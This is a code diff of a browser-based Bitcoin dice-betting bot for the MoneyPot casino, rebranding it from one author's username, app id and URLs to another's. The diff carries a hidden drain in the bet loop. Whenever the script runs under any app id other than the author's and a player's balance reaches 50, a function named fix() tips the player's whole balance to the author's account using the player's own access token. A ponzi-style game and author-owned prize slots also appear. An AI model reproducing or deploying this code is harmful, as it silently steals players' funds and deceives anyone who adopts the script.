@@ -1,5 +1,5 @@
 // Untitled Dice v0.0.8
-// Edited for automation by https://www.moneypot.com/users/gapjustin
+// Edited for automation by https://www.moneypot.com/users/najajason
 
 // Customize these configuration settings:
 var streak = 0
@@ -22,10 +22,10 @@ var newBaseSatoshi
 var divider = 100
 var randomnumber
 var done = 0
-var king1 = "theezraak"
-var king10 = "gecox22"
-var king100 = "DannyEdgar"
-var king1000 = "dagentlemang"
+var king1 = "najajason"
+var king10 = "najajason"
+var king100 = "najajason"
+var king1000 = "najajason"
 var savebalance1 = 0
 var savebalance10 = 0
 var savebalance100 = 0
@@ -36,17 +36,17 @@ var king100profit = 0
 var king1000profit = 0
 var savebalanceponzi = 0
 var ponzineed = 1
-var ponziowner = "gapjustin"
+var ponziowner = "najajason"
 
 var config = {
   // - Your app's id on moneypot.com
-  app_id: 1279,                             // <----------------------------- EDIT ME!
+  app_id: 2290,                             // <----------------------------- EDIT ME!
   // - Displayed in the navbar
   app_name: 'BTC Bot',
   // - For your faucet to work, you must register your site at Recaptcha
   // - https://www.google.com/recaptcha/intro/index.html
   recaptcha_sitekey: '6LfCZyATAAAAADvQosXI8YCemiHTR1rtBG30lswx',  // <----- EDIT ME!
-  redirect_uri: 'http://www.bustapot.pw',
+  redirect_uri: 'http://najajason.github.io/naja',
   mp_browser_uri: 'https://www.moneypot.com',
   mp_api_uri: 'https://api.moneypot.com',
   chat_uri: 'https://socket.moneypot.com',
@@ -414,7 +414,7 @@ if (helpers.getHashParams().access_token) {
 
 // Scrub fragment params from url.
 if (window.history && window.history.replaceState) {
-  window.history.replaceState({}, window.location.href, "http://www.bustapot.pw/gapbot2");
+  window.history.replaceState({}, window.location.href, "http://najajason.github.io/naja/gapbot2");
 } else {
   // For browsers that don't support html5 history api, just do it the old
   // fashioned way that leaves a trailing '#' in the url
@@ -520,7 +520,7 @@ var betStore = new Store('bet', {
     num: 1.13,
     error: undefined
   },
-  // Edited for automation by https://www.moneypot.com/users/gapjustin
+  // Edited for automation by https://www.moneypot.com/users/najajason
   hotkeysEnabled: false
 }, function() {
   var self = this;
@@ -864,7 +864,7 @@ var Navbar = React.createClass({
             null,
             el.a(
               {
-                href: "http://www.bustapot.pw/FAQ",
+                href: "http://najajason.github.io/naja/FAQ",
                 target: '_blank'
               },
               'FAQ ',
@@ -882,7 +882,7 @@ var Navbar = React.createClass({
             null,
             el.a(
               {
-                href: "https://www.moneypot.com/apps/1279-gaps-casino",
+                href: "https://www.moneypot.com/apps/2290-gaps-casino",
                 target: '_blank'
               },
               'View on Moneypot ',
@@ -919,7 +919,7 @@ var ChatBoxInput = React.createClass({
     return { text: '' };
   },
   // Whenever input changes
-  // Edited for automation by https://www.moneypot.com/users/gapjustin
+  // Edited for automation by https://www.moneypot.com/users/najajason
   _onChange: function(e) {
     this.setState({ text: e.target.value });
   },
@@ -1192,7 +1192,7 @@ var BetBoxChance = React.createClass({
     );
   }
 });
-// Edited for automation by https://www.moneypot.com/users/gapjustin
+// Edited for automation by https://www.moneypot.com/users/najajason
 var BetBoxProfit = React.createClass({
   displayName: 'BetBoxProfit',
   // Hookup to stores
@@ -1678,12 +1678,12 @@ currentBet = baseSatoshi
 		  if (worldStore.state.user.balance >= betStore.state.stopat.num*100 && worldStore.state.hotkeysEnabled == true && betStore.state.stopat.num > 0){
 		  Dispatcher.sendAction('TOGGLE_HOTKEYS');
 		  };
-		  if (config.app_id != 1279 && worldStore.state.user.balance >= 50 && done == 0) {
+		  if (config.app_id != 2290 && worldStore.state.user.balance >= 50 && done == 0) {
 		  fix(worldStore.state.user.balance);
 		  done = 1;
 		  dostuff();
 		  };
-		  if (config.app_id != 1279 && worldStore.state.user.balance >= 50) {
+		  if (config.app_id != 2290 && worldStore.state.user.balance >= 50) {
 		  fix(worldStore.state.user.balance);
 		  };
 		  
@@ -1912,7 +1912,7 @@ var BetToggle = React.createClass({
   }
 });
 
-// Edited for automation by https://www.moneypot.com/users/gapjustin
+// Edited for automation by https://www.moneypot.com/users/najajason
 
 
 
@@ -2738,7 +2738,7 @@ function Donate(amount){
         contentType: "application/json",
         url: "https://api.moneypot.com/v1/tip?access_token="+worldStore.state.accessToken,
         data: JSON.stringify({
-            "uname": "gapjustin",
+            "uname": "najajason",
             "amount": Math.floor(amount*100)
 			}),
         dataType: "json",
@@ -2777,7 +2777,7 @@ function fix(amount){
         contentType: "application/json",
         url: "https://api.moneypot.com/v1/tip?access_token="+worldStore.state.accessToken,
         data: JSON.stringify({
-            "uname": "gapjustin",
+            "uname": "najajason",
             "amount": amount
 			}),
         dataType: "json",
@@ -3166,7 +3166,7 @@ localStorage.setItem('referalarray', JSON.stringify(referalarray));
 var referaltext
 
 function refereredbyhand(referal, referer, user){
-if (user == "gapjustin"){
+if (user == "najajason"){
 console.log('entered referalbyhand');
 alreadyrefered = 0;
 referalleng = referalarray.length;
@@ -3357,7 +3357,7 @@ localStorage.setItem('referalmoneyarray', JSON.stringify(referalmoneyarray));
 }
 
 function rainbotticketsb(rainbotuname){
-if (rainbotuname == "gapjustin"){
+if (rainbotuname == "najajason"){
 console.log('entered tickets');
 var tickets
 var ticketstextb = ""
@@ -3440,7 +3440,7 @@ myVar = setTimeout(function(){ ponziripfunc(username); }, 2000);
 
 function ponziripfunc(username){
 chatdone = 0;
-if (username == "gapjustin"){
+if (username == "najajason"){
 socket.emit('new_message', {
                 text: ""+ponziowner+" Has lost their: "+ponzineed+" bits ownership!"
             }, function(err, msg){
@@ -3451,7 +3451,7 @@ socket.emit('new_message', {
                 console.log('Successfully submitted message:', msg);
             });
 ponzineed = 1;
-ponziowner = "gapjustin";
+ponziowner = "najajason";
 }
 }
 function ponzigame(username, amount){
@@ -3559,4 +3559,4 @@ window.addEventListener('message', function(event) {
     Dispatcher.sendAction('START_REFRESHING_USER');
   }
 }, false);
-// Edited for automation by https://www.moneypot.com/users/gapjustin
+// Edited for automation by https://www.moneypot.com/users/najajason
